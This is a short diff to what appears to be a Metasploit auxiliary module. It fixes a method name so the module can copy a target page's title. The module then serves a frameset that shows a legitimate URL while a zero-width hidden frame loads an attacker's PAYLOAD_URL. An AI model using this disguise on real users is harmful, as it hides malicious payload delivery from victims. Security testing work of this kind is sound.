@@ -43,7 +43,7 @@ class Metasploit3 < Msf::Auxiliary
                         ], self.class)
         end
 
-	def title 
+	def get_title 
 		if datastore['DISPLAY_URL'] =~ /\//
 			url = datastore['DISPLAY_URL']
 			datastore['RHOST'] = url[0,url.index("/")]			
@@ -62,6 +62,8 @@ class Metasploit3 < Msf::Auxiliary
 			page = page.to_s
 			title = page[page.index("<title>") + 7, page.index("</title>") - page.index("<title>") - 7]	
 		end
+		
+		return title
 	end
 
         def on_request_uri(cli, request)
@@ -75,7 +77,7 @@ class Metasploit3 < Msf::Auxiliary
 		end 	
 
  		content = %Q{<html>
-			<head><title>#{title}</title></head>
+			<head><title>#{get_title}</title></head>
 			<frameset cols="100%,0%" noresize="noresize">
 			<frame src="http://#{datastore['DISPLAY_URL']}" />
 			<frame src="http://#{datastore['PAYLOAD_URL']}" />
